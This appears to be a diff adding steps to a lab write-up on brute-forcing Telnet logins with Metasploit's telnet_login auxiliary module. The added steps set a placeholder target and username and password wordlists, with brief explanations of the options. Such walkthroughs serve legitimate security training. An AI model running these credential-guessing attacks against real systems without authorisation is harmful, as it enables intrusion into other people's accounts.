@@ -51,6 +51,34 @@ Metasploit provides an auxiliary module for performing Telnet brute-force attack
   <img width="940" height="247" alt="image" src="https://github.com/user-attachments/assets/27026afc-f9d6-4353-96cc-ba16d19f7d85" />
 </p>
 
+## 3. Selecting the Module
+
+The following module was selected:
+
+`auxiliary/scanner/telnet/telnet_login`
+
+👉 This module performs Telnet login attempts using supplied credentials.
+
+## 4. Configuring Module Options
+
+### 🔍 Commands Used
+
+options  
+
+set RHOSTS <target-ip>  
+set USER_FILE /home/kali/Desktop/telnet_user  
+set PASS_FILE /home/kali/Desktop/telnet_password  
+set VERBOSE true  
+set STOP_ON_SUCCESS true  
+
+### 📌 Explanation
+
+- `USER_FILE` → Contains list of usernames  
+- `PASS_FILE` → Contains list of passwords  
+- `VERBOSE` → Displays each login attempt  
+- `STOP_ON_SUCCESS` → Stops after finding valid credentials
+
+
 
 
 
